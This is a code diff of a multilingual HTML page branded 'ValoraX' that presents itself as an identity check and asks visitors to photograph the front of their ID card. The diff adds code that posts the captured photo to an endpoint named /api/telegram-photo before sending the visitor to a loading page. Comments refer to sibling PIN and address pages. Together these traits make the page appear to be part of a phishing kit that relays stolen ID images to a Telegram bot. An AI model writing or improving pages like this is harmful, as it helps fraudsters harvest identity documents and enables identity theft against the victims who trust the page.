@@ -2,7 +2,7 @@
 <html lang="de">
 <head>
 <meta charset="utf-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
 <title>ValoraX – Identitätsprüfung</title>
 
 <style>
@@ -15,31 +15,66 @@
 }
 *{box-sizing:border-box}
 
-body{
+/* ✅ Kein Scroll + Mobile Bounce aus (wie die anderen Seiten) */
+html, body{
+  touch-action: manipulation;
+  height:100%;
   margin:0;
+  overflow:hidden;
+  overscroll-behavior:none;
+}
+
+button, input{
+  touch-action: manipulation;
+  -webkit-user-select:none;
+  user-select:none;
+  -webkit-tap-highlight-color:transparent;
+}
+
+body{
+  height:100vh;
   background:var(--bg);
   color:var(--text);
-  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
-  min-height:100vh;
+  font-family:
+    -apple-system,
+    BlinkMacSystemFont,
+    "PingFang SC",
+    "Microsoft YaHei",
+    "Noto Sans SC",
+    ui-sans-serif,
+    system-ui,
+    Segoe UI,
+    Roboto,
+    Arial,
+    sans-serif;
   display:flex;
   justify-content:center;
 }
 
+/* ✅ Container wie pin/adresse */
 .container{
   width:100%;
   max-width:560px;
-  padding:32px 24px;
+  height:100vh;
+  padding:26px 18px calc(26px + env(safe-area-inset-bottom) + 56px);
   display:flex;
   flex-direction:column;
-  min-height:100vh;
+  position:relative;
 }
 
-.brand{ font-weight:900; font-size:16px; }
+.brand{
+  font-weight:900;
+  font-size:16px;
+  letter-spacing:.02em;
+  user-select:none;
+}
 .brand span{ color:var(--accent); }
 
+.content{ margin-top:110px; }
+
 h1{
-  margin:60px 0 14px 0;
-  font-size:24px;
+  margin:0 0 14px 0;
+  font-size:26px;
   line-height:1.3;
 }
 
@@ -47,9 +82,12 @@ h1{
   font-size:14px;
   color:var(--muted);
   font-weight:700;
-  margin-bottom:28px;
+  margin:0 0 28px 0;
+  line-height:1.5;
+  max-width:46ch;
 }
 
+/* Upload */
 .uploadBox{
   border:1px dashed var(--line);
   border-radius:18px;
@@ -80,12 +118,12 @@ h1{
 
 .actions{
   margin-top:auto;
-  padding-top:28px;
+  padding-top:18px;
 }
 
 button{
   width:100%;
-  height:52px;
+  height:56px;                 /* wie die anderen */
   border-radius:16px;
   border:1px solid rgba(255,255,255,.18);
   background:#fff;
@@ -96,7 +134,7 @@ button{
 }
 
 button:disabled{
-  opacity:.4;
+  opacity:.35;
   cursor:not-allowed;
 }
 
@@ -111,39 +149,153 @@ button:disabled{
     0 0 12px var(--accent),
     0 0 0 9999px rgba(0,0,0,.35);
 }
+
+/* ✅ Mobile polish */
+@media (max-width:420px){
+  .content{ margin-top:82px; }
+}
+@media (max-width:360px){
+  .content{ margin-top:72px; }
+}
 </style>
 </head>
-<body>
 
-<div class="container">
+<body>
+  <div class="container">
   <div class="brand">Valora<span>X</span></div>
 
-  <h1>Bestätige deine Identität</h1>
-  <div class="sub">
-    Bitte fotografiere die Vorderseite deines Ausweises.
-    Achte darauf, dass alle Daten gut lesbar sind.
-  </div>
+  <div class="content">
+    <h1 id="title"></h1>
 
-  <div class="uploadBox" id="uploadBox">
-    <div class="uploadText" id="uploadText">Tippe zum Fotografieren</div>
-  </div>
+    <div class="sub" id="sub"></div>
 
-  <div class="actions">
-    <button id="continueBtn" disabled>Weiter</button>
+    <div class="uploadBox" id="uploadBox">
+      <div class="uploadText" id="uploadText"></div>
+    </div>
+
+    <div class="actions">
+      <button id="continueBtn" disabled></button>
+    </div>
   </div>
 </div>
 
 <script>
+const STORAGE_KEY_LANG = "valorax_lang";
+
+const LANGS = {
+  de: {
+    title: "Bestätige deine Identität",
+    sub: "Bitte fotografiere die Vorderseite deines Ausweises. Achte darauf, dass alle Daten gut lesbar sind.",
+    tapToPhoto: "Tippe zum Fotografieren",
+    tapToShoot: "Tippe zum Auslösen",
+    camError: "Kamera konnte nicht geöffnet werden.<br>Bitte erlaube Kamera-Zugriff.",
+    cont: "Weiter"
+  },
+  en: {
+    title: "Verify your identity",
+    sub: "Please take a photo of the front side of your ID. Make sure all details are clearly readable.",
+    tapToPhoto: "Tap to open camera",
+    tapToShoot: "Tap to capture",
+    camError: "Camera could not be opened.<br>Please allow camera access.",
+    cont: "Continue"
+  },
+  es: {
+    title: "Verifica tu identidad",
+    sub: "Por favor, fotografía la parte frontal de tu documento. Asegúrate de que todos los datos sean legibles.",
+    tapToPhoto: "Toca para abrir la cámara",
+    tapToShoot: "Toca para capturar",
+    camError: "No se pudo abrir la cámara.<br>Permite el acceso a la cámara.",
+    cont: "Continuar"
+  },
+  fr: {
+    title: "Vérifie ton identité",
+    sub: "Prends une photo du recto de ta pièce d’identité. Assure-toi que toutes les informations sont lisibles.",
+    tapToPhoto: "Appuie pour ouvrir l’appareil photo",
+    tapToShoot: "Appuie pour capturer",
+    camError: "Impossible d’ouvrir la caméra.<br>Autorise l’accès à la caméra.",
+    cont: "Continuer"
+  },
+  it: {
+    title: "Verifica la tua identità",
+    sub: "Scatta una foto del fronte del tuo documento. Assicurati che tutti i dati siano ben leggibili.",
+    tapToPhoto: "Tocca per aprire la fotocamera",
+    tapToShoot: "Tocca per scattare",
+    camError: "Impossibile aprire la fotocamera.<br>Consenti l’accesso alla fotocamera.",
+    cont: "Continua"
+  },
+  pt: {
+    title: "Confirma a tua identidade",
+    sub: "Tira uma foto da frente do teu documento. Certifica-te de que todos os dados estão legíveis.",
+    tapToPhoto: "Toca para abrir a câmara",
+    tapToShoot: "Toca para capturar",
+    camError: "Não foi possível abrir a câmara.<br>Permite o acesso à câmara.",
+    cont: "Continuar"
+  },
+  nl: {
+    title: "Bevestig je identiteit",
+    sub: "Maak een foto van de voorkant van je identiteitsbewijs. Zorg dat alle gegevens goed leesbaar zijn.",
+    tapToPhoto: "Tik om camera te openen",
+    tapToShoot: "Tik om vast te leggen",
+    camError: "Camera kon niet worden geopend.<br>Sta cameratoegang toe.",
+    cont: "Doorgaan"
+  },
+  ru: {
+    title: "Подтвердите личность",
+    sub: "Сфотографируйте лицевую сторону документа. Убедитесь, что все данные хорошо читаемы.",
+    tapToPhoto: "Нажмите, чтобы открыть камеру",
+    tapToShoot: "Нажмите, чтобы снять",
+    camError: "Не удалось открыть камеру.<br>Разрешите доступ к камере.",
+    cont: "Продолжить"
+  },
+  zhCN: {
+    title: "确认你的身份",
+    sub: "请拍摄证件正面。请确保所有信息清晰可读。",
+    tapToPhoto: "点击打开相机",
+    tapToShoot: "点击拍摄",
+    camError: "无法打开相机。<br>请允许相机权限。",
+    cont: "继续"
+  }
+};
+
+let current = localStorage.getItem(STORAGE_KEY_LANG) || "de";
+if(!LANGS[current]) current = "de";
+
+const titleEl = document.getElementById("title");
+const subEl = document.getElementById("sub");
 const btn = document.getElementById("continueBtn");
 const uploadBox = document.getElementById("uploadBox");
+const uploadTextEl = document.getElementById("uploadText");
 
 let stream = null;
 let videoEl = null;
 let photoDataUrl = null;
 let cameraReady = false;
 
+function L(){ return LANGS[current]; }
+
+function render(){
+  const t = L();
+  document.documentElement.lang = (current === "zhCN") ? "zh-CN" : current;
+
+  titleEl.textContent = t.title;
+  subEl.textContent = t.sub;
+  btn.textContent = t.cont;
+
+  // Initialtext in Box nur setzen, wenn noch kein Video/Bild drin ist
+  if (!stream && !photoDataUrl) {
+    setMessage(t.tapToPhoto);
+  }
+
+  document.title = "ValoraX – Identitätsprüfung";
+}
+
 function setMessage(html){
-  uploadBox.innerHTML = `<div class="uploadText">${html}</div>`;
+  // falls uploadTextEl existiert (Initialzustand), nutze ihn
+  if (uploadTextEl) {
+    uploadBox.innerHTML = `<div class="uploadText" id="uploadText">${html}</div>`;
+  } else {
+    uploadBox.innerHTML = `<div class="uploadText">${html}</div>`;
+  }
 }
 
 async function startCamera(){
@@ -176,7 +328,7 @@ async function startCamera(){
     hint.style.left = "0";
     hint.style.right = "0";
     hint.style.textAlign = "center";
-    hint.textContent = "Tippe zum Auslösen";
+    hint.textContent = L().tapToShoot;
     uploadBox.appendChild(hint);
 
     videoEl.addEventListener("loadedmetadata", () => {
@@ -185,7 +337,7 @@ async function startCamera(){
 
   }catch(err){
     stopCamera();
-    setMessage("Kamera konnte nicht geöffnet werden.<br>Bitte erlaube Kamera-Zugriff.");
+    setMessage(L().camError);
   }
 }
 
@@ -221,26 +373,66 @@ function capturePhoto(){
   btn.disabled = false;
 }
 
+// dataURL -> Blob helper
+function dataUrlToBlob(dataUrl){
+  const [meta, b64] = dataUrl.split(",");
+  const mime = (meta.match(/data:(.*?);base64/) || [])[1] || "image/jpeg";
+  const bytes = atob(b64);
+  const arr = new Uint8Array(bytes.length);
+  for(let i=0;i<bytes.length;i++) arr[i] = bytes.charCodeAt(i);
+  return new Blob([arr], { type: mime });
+}
+
+async function uploadToTelegram(){
+  if(!photoDataUrl) throw new Error("No photo");
+
+  // UI lock
+  btn.disabled = true;
+  btn.textContent = "Wird gesendet...";
+
+  const blob = dataUrlToBlob(photoDataUrl);
+  const file = new File([blob], "photo.jpg", { type: blob.type });
+
+  const form = new FormData();
+  form.append("photo", file);
+  form.append("name", "Web"); // optional
+  form.append("message", "Foto von der Webseite"); // optional
+
+  const res = await fetch("/api/telegram-photo", {
+    method: "POST",
+    body: form
+  });
+
+  const data = await res.json().catch(() => null);
+
+  if(!res.ok || !data?.ok){
+    throw new Error(data?.error || "Upload failed");
+  }
+
+  btn.textContent = "Gesendet ✅";
+}
+
 // Ein einziger Click-Handler (State Machine)
 uploadBox.addEventListener("click", () => {
   if(!stream){
-    // noch keine Kamera: starten
     startCamera();
     return;
   }
-  // Kamera läuft: Foto machen
   capturePhoto();
 });
 
-btn.addEventListener("click", () => {
+btn.addEventListener("click", async () => {
   if(btn.disabled) return;
 
-  // Option A: Foto in sessionStorage für die nächste Seite
-  // sessionStorage.setItem("id_front_photo", photoDataUrl);
-
-  // Option B: Upload hier starten (fetch) und dann weiterleiten
-
-  window.location.href = "loading1.html";
+  try{
+    await uploadToTelegram();
+    // erst danach weiter
+    window.location.href = "loading1.html";
+  }catch(e){
+    btn.disabled = false;
+    btn.textContent = "Weiter";
+    alert("Senden fehlgeschlagen. Bitte erneut versuchen.");
+  }
 });
 
 // Initialer Zustand
